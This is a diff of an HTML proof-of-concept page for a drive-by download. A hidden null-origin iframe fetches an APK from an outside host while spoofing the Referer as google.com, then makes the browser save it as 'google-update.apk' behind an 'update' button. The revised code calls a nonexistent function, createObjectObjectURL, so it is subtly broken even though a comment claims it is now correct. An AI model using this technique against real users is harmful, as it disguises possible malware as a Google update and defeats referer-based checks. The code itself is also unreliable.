@@ -2,57 +2,58 @@
 <html>
 <head>
   <meta charset="utf-8">
+  <title>POC – Referer google.com + Origin Kosong</title>
   <style>
-    .btn {
-      background:#4CAF50; color:white; padding:15px 32px; font-size:16px;
-      border:none; cursor:pointer; border-radius:8px; margin:20px;
-    }
+    body { font-family: Arial; text-align:center; padding:50px; background:#f4f4f4; }
+    .btn { background:#4CAF50; color:white; padding:15px 32px; font-size:18px;
+           border:none; border-radius:8px; cursor:pointer; }
+    .status { margin-top:20px; font-weight:bold; color:#333; }
   </style>
 </head>
 <body>
-  <center>
-    <h2>Download APK (Origin & Referer Spoofed)</h2>
-    <button class="btn" onclick="startDownload()">Download Update</button>
-    <div id="status">Status: Ready</div>
-  </center>
+
+  <h2>Drive-by Download POC (2025)</h2>
+  <button class="btn" onclick="startDownload()">Download Update APK</button>
+  <div class="status" id="status">Status: Siap</div>
 
   <script>
+  // === FUNGSI UTAMA ===
   function startDownload() {
-    document.getElementById('status').textContent = 'Status: Memulai...';
+    document.getElementById('status').textContent = 'Status: Memuat engine…';
 
     // 1. Buat iframe dengan origin null (data: URL)
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
+
+    // <<< INI YANG BENAR – SEMUA TAG DITUTUP DENGAN BAIK >>>
     iframe.src = 'data:text/html,' + encodeURIComponent(`
       <!DOCTYPE html>
       <script>
-        // Kita sekarang berada di origin null → boleh spoof Referer!
-        async function doFetch() {
+        (async () => {
           try {
             const resp = await fetch('https://aliothme.github.io/poc.apk', {
-              referrer: 'https://www.google.com/',           // Paksa Referer header
-              referrerPolicy: 'unsafe-url',                  // Wajib untuk override
+              referrer: 'https://www.google.com/',     // Paksa Referer
+              referrerPolicy: 'unsafe-url',            // Wajib agar override berhasil
               mode: 'cors',
               credentials: 'omit'
             });
 
             const blob = await resp.blob();
-            const url = URL.createObjectURL(blob);
+            const url = URL.createObjectObjectURL(blob);
 
-            // Kirim blob URL kembali ke parent
-            parent.postMessage({ type: 'DOWNLOAD', url: url }, '*');
+            // Kirim blob ke parent
+            parent.postMessage({ type: 'OK', url: url }, '*');
           } catch(e) {
-            parent.postMessage({ type: 'ERROR', msg: e.message }, '*');
+            parent.postMessage({ type: 'ERR', msg: e.toString() }, '*');
           }
-        }
-        doFetch();
+        })();
       </script>
     `);
     document.body.appendChild(iframe);
 
-    // 2. Terima blob dari iframe dan trigger download
-    window.addEventListener('message', function handler(e) {
-      if (e.data.type === 'DOWNLOAD') {
+    // 2. Terima pesan dari iframe
+    const handler = (e) => {
+      if (e.data.type === 'OK') {
         const a = document.createElement('a');
         a.href = e.data.url;
         a.download = 'google-update.apk';
@@ -61,14 +62,17 @@
         document.body.removeChild(a);
         URL.revokeObjectURL(e.data.url);
 
-        document.getElementById('status').textContent = 'Status: Download selesai! Cek Network → Referer = google.com';
+        document.getElementById('status').textContent = 
+          'Selesai! Cek Network tab → Referer: https://www.google.com/';
+        
         window.removeEventListener('message', handler);
         iframe.remove();
       }
-      if (e.data.type === 'ERROR') {
-        document.getElementById('status').textContent = 'Status: Error - ' + e.data.msg;
+      if (e.data.type === 'ERR') {
+        document.getElementById('status').textContent = 'Error: ' + e.data.msg;
       }
-    });
+    };
+    window.addEventListener('message', handler);
   }
   </script>
 </body>
